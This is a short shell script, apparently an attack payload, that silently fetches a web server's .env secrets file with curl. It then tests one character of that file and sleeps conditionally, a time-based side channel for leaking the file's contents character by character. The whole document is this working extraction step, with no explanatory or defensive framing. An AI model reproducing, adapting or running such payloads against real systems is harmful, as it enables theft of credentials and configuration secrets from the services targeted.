#!/bin/sh
curl -s -o /wa https://playerapi.hubgaming.com/.env
[ "$(tail -c +3 /wa|head -c1)" < 'e' ]&&sleep 25
sleep 12
